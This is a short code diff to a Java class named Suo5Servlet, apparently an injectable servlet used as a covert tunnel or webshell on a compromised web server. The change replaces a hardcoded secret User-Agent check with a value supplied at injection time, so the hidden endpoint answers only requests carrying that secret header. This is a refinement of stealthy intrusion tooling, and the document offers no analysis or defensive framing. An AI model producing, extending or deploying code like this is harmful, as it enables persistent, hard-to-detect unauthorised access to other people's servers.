@@ -26,6 +26,7 @@ public final class Suo5Servlet extends ClassLoader implements Servlet, Runnable,
     private ServletContext servletContext;
     private ServletConfig servletConfig;
     private String servletPath;
+    private String userAgent;
 
     public static HashMap addrs = collectAddr();
     public static HashMap ctx = new HashMap();
@@ -530,6 +531,7 @@ public final class Suo5Servlet extends ClassLoader implements Servlet, Runnable,
             this.parameterMap = (HashMap)obj;
             this.servletContext = (ServletContext)this.parameterMap.get("servletContext");
             this.servletPath = getp("servletPath");
+            this.userAgent = getp("userAgent");
             return true;
         } catch (Exception var3) {
             return false;
@@ -761,7 +763,7 @@ public final class Suo5Servlet extends ClassLoader implements Servlet, Runnable,
         String agent = request.getHeader("User-Agent");
         String contentType = request.getHeader("Content-Type");
 
-        if (agent == null || !agent.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
+        if (agent == null || !agent.equals(this.userAgent)) {
             return;
         }
         if (contentType == null) {
